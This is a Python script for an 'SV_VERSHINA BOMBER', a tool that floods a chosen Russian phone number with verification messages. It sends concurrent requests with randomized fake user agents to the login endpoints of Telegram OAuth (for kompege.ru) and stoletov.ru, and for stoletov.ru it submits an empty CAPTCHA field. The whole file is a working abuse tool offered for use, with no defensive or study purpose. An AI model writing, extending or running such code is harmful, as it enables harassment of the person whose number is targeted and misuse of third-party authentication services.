
import asyncio
import re
from abc import ABC, abstractmethod
from pprint import pprint

import aiohttp
import pyfiglet
from fake_useragent import UserAgent


class BaseSendBomb(ABC):
    @abstractmethod
    async def bomb(self, phone_number: str) -> None:
        raise NotImplementedError
    
    async def _send_request(self, url: str, headers: dict, params: dict, data: dict, name: str, request_type: str) -> None:
        async with aiohttp.ClientSession() as session:
            try:
                request_types = {
                    "post": session.post,
                    "get": session.get
                }

                response = await request_types[request_type.lower()](
                    url=url,
                    headers=headers,
                    params=params,
                    data=data,
                )

                status_code = response.status
                if 200 <= status_code <= 299:
                    print(f"{name} OK: {status_code} code")
                else:
                    print(f"{name} ERROR: {status_code} code")

            except Exception as error:
                print(f"Ошибка: {str(error)}")


class KompEgeSendBomb(BaseSendBomb):
    async def bomb(self, phone_number: str) -> None:
        url = "https://oauth.telegram.org/auth/request"

        headers = {
            "User-Agent": UserAgent().random,
        }

        params = {
            "bot_id": "6399649243",
            "origin": "https://kompege.ru",
            "embed": "1",
            "return_to": "https://kompege.ru/login"
        }

        data = {
            "phone": phone_number[1:]
        }

        await self._send_request(
            url=url,
            headers=headers,
            params=params,
            data=data,
            name="Komp Ege",
            request_type="post",
        )


class StoletovSendBomb(BaseSendBomb):
    async def bomb(self, phone_number: str) -> None:
        url = "https://stoletov.ru/api/customer/auth-sms/"

        headers = {
            "User-Agent": UserAgent().random,
        }

        params = {
        
        }

        data = {
            "g-recaptcha-response": "",
            "phоne": phone_number[1:]
        }

        await self._send_request(
            url=url,
            headers=headers,
            params=params,
            data=data,
            name="Stoletov",
            request_type="post",
        )


class SendBombComposer:
    async def bomb(self, phone_number: str, bombers: list) -> None:
        await asyncio.gather(*[bomber.bomb(phone_number) for bomber in bombers])


def draw_banner():
    fig = pyfiglet.Figlet(font='slant')
    auto_banner1 = fig.renderText('SV_VERSHINA')
    auto_banner2 = fig.renderText('BOMBER')
    
    print("\n" + "=" * 70)
    for line in auto_banner1.split('\n'):
        if line.strip():
            pprint(line, width=70)
    
    for line in auto_banner2.split('\n'):
        if line.strip():
            pprint(line, width=70)
    print("=" * 70 + "\n")


async def main():
    draw_banner()

    pattern = r'^\+7\d{10}$'
    while True:
        phone_number = input(f"Введите номер телефона номер в формате +7{'X' * 10}: ")
        if bool(re.match(pattern, phone_number)):
            break
        
        print("Неправильный формат номера телефона!")

    bombers = [
        KompEgeSendBomb(),
        StoletovSendBomb()
    ]
    bomber = SendBombComposer()
    await bomber.bomb(phone_number, bombers)


if __name__ == '__main__':
    asyncio.run(main())
